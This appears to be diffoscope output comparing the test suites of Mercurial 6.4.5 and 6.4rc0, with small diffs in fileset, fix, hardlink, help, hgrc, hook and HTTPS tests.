### Comparing `mercurial-6.4.5/tests/test-extdiff.t` & `mercurial-6.4rc0/tests/test-extdiff.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-extension-timing.t` & `mercurial-6.4rc0/tests/test-extension-timing.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-extension.t` & `mercurial-6.4rc0/tests/test-extension.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-extensions-afterloaded.t` & `mercurial-6.4rc0/tests/test-extensions-afterloaded.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-extensions-wrapfunction.py` & `mercurial-6.4rc0/tests/test-extensions-wrapfunction.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-extensions-wrapfunction.py.out` & `mercurial-6.4rc0/tests/test-extensions-wrapfunction.py.out`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fastannotate-corrupt.t` & `mercurial-6.4rc0/tests/test-fastannotate-corrupt.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fastannotate-hg.t` & `mercurial-6.4rc0/tests/test-fastannotate-hg.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fastannotate-perfhack.t` & `mercurial-6.4rc0/tests/test-fastannotate-perfhack.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fastannotate-protocol.t` & `mercurial-6.4rc0/tests/test-fastannotate-protocol.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fastannotate-renames.t` & `mercurial-6.4rc0/tests/test-fastannotate-renames.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fastannotate-revmap.py` & `mercurial-6.4rc0/tests/test-fastannotate-revmap.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fastannotate.t` & `mercurial-6.4rc0/tests/test-fastannotate.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fastexport.t` & `mercurial-6.4rc0/tests/test-fastexport.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fetch.t` & `mercurial-6.4rc0/tests/test-fetch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-filebranch.t` & `mercurial-6.4rc0/tests/test-filebranch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-filecache.py` & `mercurial-6.4rc0/tests/test-filecache.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-filecache.py.out` & `mercurial-6.4rc0/tests/test-filecache.py.out`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-filelog.py` & `mercurial-6.4rc0/tests/test-filelog.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fileset-generated.t` & `mercurial-6.4rc0/tests/test-fileset-generated.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fileset.t` & `mercurial-6.4rc0/tests/test-fileset.t`

 * *Files 0% similar despite different names*

```diff
@@ -49,15 +49,15 @@
     (kindpat
       (symbol 'path')
       (symbol 'a1'))
     (kindpat
       (symbol 'glob')
       (symbol 'b?')))
   * matcher:
-  <patternmatcher patterns='b.$|a1(?:/|$)'>
+  <patternmatcher patterns='a1(?:/|$)|b.$'>
   a1
   b1
   b2
   $ fileset -v --no-show-matcher 'a1 or a2'
   (or
     (symbol 'a1')
     (symbol 'a2'))
```

### Comparing `mercurial-6.4.5/tests/test-fix-clang-format.t` & `mercurial-6.4rc0/tests/test-fix-clang-format.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fix-metadata.t` & `mercurial-6.4rc0/tests/test-fix-metadata.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fix-pickle.t` & `mercurial-6.4rc0/tests/test-fix-pickle.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fix-topology.t` & `mercurial-6.4rc0/tests/test-fix-topology.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fix.t` & `mercurial-6.4rc0/tests/test-fix.t`

 * *Files 0% similar despite different names*

```diff
@@ -80,19 +80,18 @@
 Help text for fix.
 
   $ hg help fix
   hg fix [OPTION]... [FILE]...
   
   rewrite file content in changesets or working directory
   
-      Runs any configured tools to fix the content of files. (See 'hg help -e
-      fix' for details about configuring tools.) Only affects files with
-      changes, unless file arguments are provided. Only affects changed lines of
-      files, unless the --whole flag is used. Some tools may always affect the
-      whole file regardless of --whole.
+      Runs any configured tools to fix the content of files. Only affects files
+      with changes, unless file arguments are provided. Only affects changed
+      lines of files, unless the --whole flag is used. Some tools may always
+      affect the whole file regardless of --whole.
   
       If --working-dir is used, files with uncommitted changes in the working
       copy will be fixed. Note that no backup are made.
   
       If revisions are specified with --source, those revisions and their
       descendants will be checked, and they may be replaced with new revisions
       that have fixed file content. By automatically including the descendants,
@@ -122,21 +121,14 @@
   $ hg help -e fix
   fix extension - rewrite file content in changesets or working copy
   (EXPERIMENTAL)
   
   Provides a command that runs configured tools on the contents of modified
   files, writing back any fixes to the working copy or replacing changesets.
   
-  Fixer tools are run in the repository's root directory. This allows them to
-  read configuration files from the working copy, or even write to the working
-  copy. The working copy is not updated to match the revision being fixed. In
-  fact, several revisions may be fixed in parallel. Writes to the working copy
-  are not amended into the revision being fixed; fixer tools MUST always read
-  content to be fixed from stdin, and write fixed file content back to stdout.
-  
   Here is an example configuration that causes 'hg fix' to apply automatic
   formatting fixes to modified lines in C++ code:
   
     [fix]
     clang-format:command=clang-format --assume-filename={rootpath}
     clang-format:linerange=--lines={first}:{last}
     clang-format:pattern=set:**.cpp or **.hpp
@@ -235,14 +227,21 @@
       "$HG_REPLACEMENTS" with information about what revisions were created and
       made obsolete. Provides a boolean "$HG_WDIRWRITTEN" to indicate whether any
       files in the working copy were updated. Provides a list "$HG_METADATA"
       mapping fixer tool names to lists of metadata values returned from
       executions that modified a file. This aggregates the same metadata
       previously passed to the "postfixfile" hook.
   
+  Fixer tools are run in the repository's root directory. This allows them to
+  read configuration files from the working copy, or even write to the working
+  copy. The working copy is not updated to match the revision being fixed. In
+  fact, several revisions may be fixed in parallel. Writes to the working copy
+  are not amended into the revision being fixed; fixer tools should always write
+  fixed file content back to stdout as documented above.
+  
   list of commands:
   
    fix           rewrite file content in changesets or working directory
   
   (use 'hg help -v -e fix' to show built-in aliases and global options)
 
 There is no default behavior in the absence of --rev and --working-dir.
```

### Comparing `mercurial-6.4.5/tests/test-flagprocessor.t` & `mercurial-6.4rc0/tests/test-flagprocessor.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-flags.t` & `mercurial-6.4rc0/tests/test-flags.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fncache.t` & `mercurial-6.4rc0/tests/test-fncache.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-fuzz-targets.t` & `mercurial-6.4rc0/tests/test-fuzz-targets.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-gendoc-ja.t` & `mercurial-6.4rc0/tests/test-gendoc-ja.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-gendoc.t` & `mercurial-6.4rc0/tests/test-gendoc.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-generaldelta.t` & `mercurial-6.4rc0/tests/test-generaldelta.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-getbundle.t` & `mercurial-6.4rc0/tests/test-getbundle.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-git-export.t` & `mercurial-6.4rc0/tests/test-git-export.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-git-interop.t` & `mercurial-6.4rc0/tests/test-git-interop.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-githelp.t` & `mercurial-6.4rc0/tests/test-githelp.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-globalopts.t` & `mercurial-6.4rc0/tests/test-globalopts.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-glog-beautifygraph.t` & `mercurial-6.4rc0/tests/test-glog-beautifygraph.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-glog-topological.t` & `mercurial-6.4rc0/tests/test-glog-topological.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-glog.t` & `mercurial-6.4rc0/tests/test-glog.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-gpg.t` & `mercurial-6.4rc0/tests/test-gpg.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-graft-interrupted.t` & `mercurial-6.4rc0/tests/test-graft-interrupted.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-graft-rename.t` & `mercurial-6.4rc0/tests/test-graft-rename.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-graft.t` & `mercurial-6.4rc0/tests/test-graft.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-grep.t` & `mercurial-6.4rc0/tests/test-grep.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hardlinks.t` & `mercurial-6.4rc0/tests/test-hardlinks.t`

 * *Files 2% similar despite different names*

```diff
@@ -137,14 +137,16 @@
   1 r3/.hg/store/data/d1/f2.d
   1 r3/.hg/store/data/d1/f2.i
   1 r3/.hg/store/data/f1.i
   1 r3/.hg/store/fncache (repofncache !)
   1 r3/.hg/store/phaseroots
   1 r3/.hg/store/requires
   1 r3/.hg/store/undo
+  1 r3/.hg/store/undo.backup.fncache (repofncache !)
+  1 r3/.hg/store/undo.backup.phaseroots
   1 r3/.hg/store/undo.backupfiles
 
 Push to repo r1 should break up most hardlinks in r2:
 
   $ hg -R r2 verify -q
 
   $ cd r3
@@ -247,14 +249,16 @@
   2 r4/.hg/store/data/d1/f2.i
   2 r4/.hg/store/data/f1.i
   2 r4/.hg/store/data/f3.i
   2 r4/.hg/store/fncache (repofncache !)
   2 r4/.hg/store/phaseroots
   2 r4/.hg/store/requires
   2 r4/.hg/store/undo
+  2 r4/.hg/store/undo.backup.fncache (repofncache !)
+  2 r4/.hg/store/undo.backup.phaseroots
   2 r4/.hg/store/undo.backupfiles
   [24] r4/.hg/undo.backup.branch (re)
   2 r4/\.hg/undo\.backup\.dirstate (re)
   2 r4/.hg/undo.desc
   2 r4/.hg/wcache/checkisexec (execbit !)
   2 r4/.hg/wcache/checklink-target (symlink !)
   2 r4/.hg/wcache/checknoexec (execbit !)
@@ -300,14 +304,16 @@
   2 r4/.hg/store/data/d1/f2.i
   2 r4/.hg/store/data/f1.i
   2 r4/.hg/store/data/f3.i
   2 r4/.hg/store/fncache
   2 r4/.hg/store/phaseroots
   2 r4/.hg/store/requires
   2 r4/.hg/store/undo
+  2 r4/.hg/store/undo.backup.fncache (repofncache !)
+  2 r4/.hg/store/undo.backup.phaseroots
   2 r4/.hg/store/undo.backupfiles
   [23] r4/.hg/undo.backup.branch (re)
   2 r4/\.hg/undo\.backup\.dirstate (re)
   2 r4/.hg/undo.desc
   2 r4/.hg/wcache/checkisexec (execbit !)
   2 r4/.hg/wcache/checklink-target (symlink !)
   2 r4/.hg/wcache/checknoexec (execbit !)
```

### Comparing `mercurial-6.4.5/tests/test-hashutil.py` & `mercurial-6.4rc0/tests/test-hashutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-help-hide.t` & `mercurial-6.4rc0/tests/test-help-hide.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-help.t` & `mercurial-6.4rc0/tests/test-help.t`

 * *Files 0% similar despite different names*

```diff
@@ -1984,15 +1984,15 @@
 replacement makes message meaningless.
 
 This tests that section lookup by translated string isn't broken by
 such str.lower().
 
   $ "$PYTHON" <<EOF
   > def escape(s):
-  >     return b''.join(br'\\u%x' % ord(uc) for uc in s.decode('cp932'))
+  >     return b''.join(b'\\u%x' % ord(uc) for uc in s.decode('cp932'))
   > # translation of "record" in ja_JP.cp932
   > upper = b"\x8bL\x98^"
   > # str.lower()-ed section name should be treated as different one
   > lower = b"\x8bl\x98^"
   > with open('ambiguous.py', 'wb') as fp:
   >     fp.write(b"""# ambiguous section names in ja_JP.cp932
   > u'''summary of extension
```

### Comparing `mercurial-6.4.5/tests/test-hg-parseurl.py` & `mercurial-6.4rc0/tests/test-hg-parseurl.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hghave.t` & `mercurial-6.4rc0/tests/test-hghave.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgignore.t` & `mercurial-6.4rc0/tests/test-hgignore.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgk.t` & `mercurial-6.4rc0/tests/test-hgk.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgrc.t` & `mercurial-6.4rc0/tests/test-hgrc.t`

 * *Files 1% similar despite different names*

```diff
@@ -55,15 +55,15 @@
   $ echo 'option = value' >> $TESTTMP/included
   $ echo '%include $TESTTMP/included' >> $HGRC
   $ hg showconfig section
   section.option=value
 #if unix-permissions no-root
   $ chmod u-r $TESTTMP/included
   $ hg showconfig section
-  config error at $TESTTMP/hgrc:2: cannot include $TESTTMP/included ($EACCES$*) (glob)
+  config error at $TESTTMP/hgrc:2: cannot include $TESTTMP/included (Permission denied*) (glob)
   [255]
 #endif
 
 issue1829: wrong indentation
 
   $ echo '[foo]' > $HGRC
   $ echo '  x = y' >> $HGRC
```

### Comparing `mercurial-6.4.5/tests/test-hgweb-annotate-whitespace.t` & `mercurial-6.4rc0/tests/test-hgweb-annotate-whitespace.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-auth.py` & `mercurial-6.4rc0/tests/test-hgweb-auth.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-auth.py.out` & `mercurial-6.4rc0/tests/test-hgweb-auth.py.out`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-bundle.t` & `mercurial-6.4rc0/tests/test-hgweb-bundle.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-commands.t` & `mercurial-6.4rc0/tests/test-hgweb-commands.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-csp.t` & `mercurial-6.4rc0/tests/test-hgweb-csp.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-descend-empties.t` & `mercurial-6.4rc0/tests/test-hgweb-descend-empties.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-diffs.t` & `mercurial-6.4rc0/tests/test-hgweb-diffs.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-empty.t` & `mercurial-6.4rc0/tests/test-hgweb-empty.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-filelog.t` & `mercurial-6.4rc0/tests/test-hgweb-filelog.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-head.t` & `mercurial-6.4rc0/tests/test-hgweb-head.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-json.t` & `mercurial-6.4rc0/tests/test-hgweb-json.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-no-path-info.t` & `mercurial-6.4rc0/tests/test-hgweb-no-path-info.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-no-request-uri.t` & `mercurial-6.4rc0/tests/test-hgweb-no-request-uri.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-non-interactive.t` & `mercurial-6.4rc0/tests/test-hgweb-non-interactive.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-raw.t` & `mercurial-6.4rc0/tests/test-hgweb-raw.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-removed.t` & `mercurial-6.4rc0/tests/test-hgweb-removed.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb-symrev.t` & `mercurial-6.4rc0/tests/test-hgweb-symrev.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgweb.t` & `mercurial-6.4rc0/tests/test-hgweb.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgwebdir-gc.py` & `mercurial-6.4rc0/tests/test-hgwebdir-gc.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgwebdir-paths.py` & `mercurial-6.4rc0/tests/test-hgwebdir-paths.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgwebdir.t` & `mercurial-6.4rc0/tests/test-hgwebdir.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hgwebdirsym.t` & `mercurial-6.4rc0/tests/test-hgwebdirsym.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-highlight.t` & `mercurial-6.4rc0/tests/test-highlight.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-arguments.t` & `mercurial-6.4rc0/tests/test-histedit-arguments.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-base.t` & `mercurial-6.4rc0/tests/test-histedit-base.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-bookmark-motion.t` & `mercurial-6.4rc0/tests/test-histedit-bookmark-motion.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-commute.t` & `mercurial-6.4rc0/tests/test-histedit-commute.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-drop.t` & `mercurial-6.4rc0/tests/test-histedit-drop.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-edit.t` & `mercurial-6.4rc0/tests/test-histedit-edit.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-fold-non-commute.t` & `mercurial-6.4rc0/tests/test-histedit-fold-non-commute.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-fold.t` & `mercurial-6.4rc0/tests/test-histedit-fold.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-merge-tools.t` & `mercurial-6.4rc0/tests/test-histedit-merge-tools.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-no-backup.t` & `mercurial-6.4rc0/tests/test-histedit-no-backup.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-no-change.t` & `mercurial-6.4rc0/tests/test-histedit-no-change.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-non-commute-abort.t` & `mercurial-6.4rc0/tests/test-histedit-non-commute-abort.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-non-commute.t` & `mercurial-6.4rc0/tests/test-histedit-non-commute.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-obsolete.t` & `mercurial-6.4rc0/tests/test-histedit-obsolete.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-outgoing.t` & `mercurial-6.4rc0/tests/test-histedit-outgoing.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-histedit-templates.t` & `mercurial-6.4rc0/tests/test-histedit-templates.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hook.t` & `mercurial-6.4rc0/tests/test-hook.t`

 * *Files 1% similar despite different names*

```diff
@@ -2476,58 +2476,8 @@
 00009ab0: 2323 2323 2323 2320 706c 6169 6e3a 2031  ####### plain: 1
 00009ac0: 0a20 2023 2323 206e 6f20 2323 2323 2323  .  ### no ######
 00009ad0: 2323 2070 6c61 696e 3a20 3c75 6e73 6574  ## plain: <unset
 00009ae0: 3e0a 2020 2323 2320 6175 746f 2023 2323  >.  ### auto ###
 00009af0: 2323 2320 706c 6169 6e3a 2031 0a20 204d  ### plain: 1.  M
 00009b00: 6572 6375 7269 616c 2044 6973 7472 6962  ercurial Distrib
 00009b10: 7574 6564 2053 434d 2028 2a29 2028 676c  uted SCM (*) (gl
-00009b20: 6f62 290a 0a54 6573 7420 686f 6f6b 2074  ob)..Test hook t
-00009b30: 6861 7420 6368 616e 6765 2074 6865 2075  hat change the u
-00009b40: 6e64 6572 6c79 696e 6720 7265 706f 0a3d  nderlying repo.=
-00009b50: 3d3d 3d3d 3d3d 3d3d 3d3d 3d3d 3d3d 3d3d  ================
-00009b60: 3d3d 3d3d 3d3d 3d3d 3d3d 3d3d 3d3d 3d3d  ================
-00009b70: 3d3d 3d3d 3d3d 3d3d 0a0a 626c 6163 6b62  ========..blackb
-00009b80: 6f78 2061 6363 6573 7320 7468 6520 6469  ox access the di
-00009b90: 7273 7461 7465 2061 6674 6572 7761 7264  rstate afterward
-00009ba0: 2061 6e64 2063 616e 2073 6565 2061 2063   and can see a c
-00009bb0: 6861 6e67 656c 6f67 202f 2064 6972 7374  hangelog / dirst
-00009bc0: 6174 650a 6465 7379 6e63 2e0a 0a0a 2020  ate.desync....  
-00009bd0: 2420 6364 2024 5445 5354 544d 500a 2020  $ cd $TESTTMP.  
-00009be0: 2420 6361 7420 3c3c 454f 4620 3e3e 2024  $ cat <<EOF >> $
-00009bf0: 4847 5243 5041 5448 0a20 203e 205b 6578  HGRCPATH.  > [ex
-00009c00: 7465 6e73 696f 6e73 5d0a 2020 3e20 626c  tensions].  > bl
-00009c10: 6163 6b62 6f78 3d0a 2020 3e20 5b68 6f6f  ackbox=.  > [hoo
-00009c20: 6b73 5d0a 2020 3e20 706f 7374 2d6d 6572  ks].  > post-mer
-00009c30: 6765 203d 2068 6720 636f 6d6d 6974 202d  ge = hg commit -
-00009c40: 6d20 2261 7574 6f20 6d65 7267 6522 0a20  m "auto merge". 
-00009c50: 203e 2045 4f46 0a0a 2020 2420 6867 2069   > EOF..  $ hg i
-00009c60: 6e69 7420 740a 2020 2420 6364 2074 0a20  nit t.  $ cd t. 
-00009c70: 2024 2074 6f75 6368 2022 2e68 6769 676e   $ touch ".hgign
-00009c80: 6f72 6522 0a20 2024 2068 6720 636f 6d6d  ore".  $ hg comm
-00009c90: 6974 202d 416d 2022 696e 6974 6961 6c22  it -Am "initial"
-00009ca0: 202d 6427 3020 3027 0a20 2061 6464 696e   -d'0 0'.  addin
-00009cb0: 6720 2e68 6769 676e 6f72 650a 0a20 2024  g .hgignore..  $
-00009cc0: 2065 6368 6f20 5468 6973 2069 7320 6669   echo This is fi
-00009cd0: 6c65 2061 3120 3e20 610a 2020 2420 6867  le a1 > a.  $ hg
-00009ce0: 2063 6f6d 6d69 7420 2d41 6d20 2263 6f6d   commit -Am "com
-00009cf0: 6d69 7420 2331 2220 2d64 2730 2030 270a  mit #1" -d'0 0'.
-00009d00: 2020 6164 6469 6e67 2061 0a0a 2020 2420    adding a..  $ 
-00009d10: 6867 2075 7064 6174 6520 300a 2020 3020  hg update 0.  0 
-00009d20: 6669 6c65 7320 7570 6461 7465 642c 2030  files updated, 0
-00009d30: 2066 696c 6573 206d 6572 6765 642c 2031   files merged, 1
-00009d40: 2066 696c 6573 2072 656d 6f76 6564 2c20   files removed, 
-00009d50: 3020 6669 6c65 7320 756e 7265 736f 6c76  0 files unresolv
-00009d60: 6564 0a20 2024 2065 6368 6f20 5468 6973  ed.  $ echo This
-00009d70: 2069 7320 6669 6c65 2062 3120 3e20 620a   is file b1 > b.
-00009d80: 2020 2420 6867 2063 6f6d 6d69 7420 2d41    $ hg commit -A
-00009d90: 6d20 2263 6f6d 6d69 7420 2332 2220 2d64  m "commit #2" -d
-00009da0: 2730 2030 270a 2020 6164 6469 6e67 2062  '0 0'.  adding b
-00009db0: 0a20 2063 7265 6174 6564 206e 6577 2068  .  created new h
-00009dc0: 6561 640a 0a20 2024 2068 6720 6d65 7267  ead..  $ hg merg
-00009dd0: 6520 310a 2020 3120 6669 6c65 7320 7570  e 1.  1 files up
-00009de0: 6461 7465 642c 2030 2066 696c 6573 206d  dated, 0 files m
-00009df0: 6572 6765 642c 2030 2066 696c 6573 2072  erged, 0 files r
-00009e00: 656d 6f76 6564 2c20 3020 6669 6c65 7320  emoved, 0 files 
-00009e10: 756e 7265 736f 6c76 6564 0a20 2028 6272  unresolved.  (br
-00009e20: 616e 6368 206d 6572 6765 2c20 646f 6e27  anch merge, don'
-00009e30: 7420 666f 7267 6574 2074 6f20 636f 6d6d  t forget to comm
-00009e40: 6974 290a 0a20 2024 2063 6420 2e2e 0a    it)..  $ cd ...
+00009b20: 6f62 290a                                ob).
```

### Comparing `mercurial-6.4.5/tests/test-hooklib-changeset_obsoleted.t` & `mercurial-6.4rc0/tests/test-hooklib-changeset_obsoleted.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hooklib-changeset_published.t` & `mercurial-6.4rc0/tests/test-hooklib-changeset_published.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hooklib-enforce_draft_commits.t` & `mercurial-6.4rc0/tests/test-hooklib-enforce_draft_commits.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hooklib-reject_merge_commits.t` & `mercurial-6.4rc0/tests/test-hooklib-reject_merge_commits.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-hooklib-reject_new_heads.t` & `mercurial-6.4rc0/tests/test-hooklib-reject_new_heads.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-http-bad-server.t` & `mercurial-6.4rc0/tests/test-http-bad-server.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-http-branchmap.t` & `mercurial-6.4rc0/tests/test-http-branchmap.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-http-bundle1.t` & `mercurial-6.4rc0/tests/test-http-bundle1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-http-clone-r.t` & `mercurial-6.4rc0/tests/test-http-clone-r.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-http-permissions.t` & `mercurial-6.4rc0/tests/test-http-permissions.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-http-protocol.t` & `mercurial-6.4rc0/tests/test-http-protocol.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-http-proxy.t` & `mercurial-6.4rc0/tests/test-http-proxy.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-http.t` & `mercurial-6.4rc0/tests/test-http.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-https.t` & `mercurial-6.4rc0/tests/test-https.t`

 * *Files 1% similar despite different names*

```diff
@@ -340,29 +340,29 @@
   $ killdaemons.py hg2.pid
 
 #if tls1.2
 Start servers running supported TLS versions
 
   $ cd test
   $ hg serve -p $HGPORT -d --pid-file=../hg0.pid --certificate=$PRIV \
-  > --config devel.server-insecure-exact-protocol=tls1.0
+  > --config devel.serverexactprotocol=tls1.0
   $ cat ../hg0.pid >> $DAEMON_PIDS
   $ hg serve -p $HGPORT1 -d --pid-file=../hg1.pid --certificate=$PRIV \
-  > --config devel.server-insecure-exact-protocol=tls1.1
+  > --config devel.serverexactprotocol=tls1.1
   $ cat ../hg1.pid >> $DAEMON_PIDS
   $ hg serve -p $HGPORT2 -d --pid-file=../hg2.pid --certificate=$PRIV \
-  > --config devel.server-insecure-exact-protocol=tls1.2
+  > --config devel.serverexactprotocol=tls1.2
   $ cat ../hg2.pid >> $DAEMON_PIDS
   $ cd ..
 
 Clients talking same TLS versions work
 
-  $ P="$CERTSDIR" hg --config hostsecurity.minimumprotocol=tls1.0 --config hostsecurity.ciphers="DEFAULT:@SECLEVEL=0" id https://localhost:$HGPORT/
+  $ P="$CERTSDIR" hg --config hostsecurity.minimumprotocol=tls1.0 --config hostsecurity.ciphers=DEFAULT id https://localhost:$HGPORT/
   5fed3813f7f5
-  $ P="$CERTSDIR" hg --config hostsecurity.minimumprotocol=tls1.1 --config hostsecurity.ciphers="DEFAULT:@SECLEVEL=0" id https://localhost:$HGPORT1/
+  $ P="$CERTSDIR" hg --config hostsecurity.minimumprotocol=tls1.1 --config hostsecurity.ciphers=DEFAULT id https://localhost:$HGPORT1/
   5fed3813f7f5
   $ P="$CERTSDIR" hg --config hostsecurity.minimumprotocol=tls1.2 id https://localhost:$HGPORT2/
   5fed3813f7f5
 
 Clients requiring newer TLS version than what server supports fail
 
   $ P="$CERTSDIR" hg id https://localhost:$HGPORT/
@@ -396,15 +396,15 @@
   $ hg --config hostsecurity.minimumprotocol=tls1.2 id --insecure https://localhost:$HGPORT1/
   warning: connection security to localhost is disabled per current settings; communication is susceptible to eavesdropping and tampering
   5fed3813f7f5
 
 The per-host config option overrides the default
 
   $ P="$CERTSDIR" hg id https://localhost:$HGPORT/ \
-  > --config hostsecurity.ciphers="DEFAULT:@SECLEVEL=0" \
+  > --config hostsecurity.ciphers=DEFAULT \
   > --config hostsecurity.minimumprotocol=tls1.2 \
   > --config hostsecurity.localhost:minimumprotocol=tls1.0
   5fed3813f7f5
 
 The per-host config option by itself works
 
   $ P="$CERTSDIR" hg id https://localhost:$HGPORT/ \
```

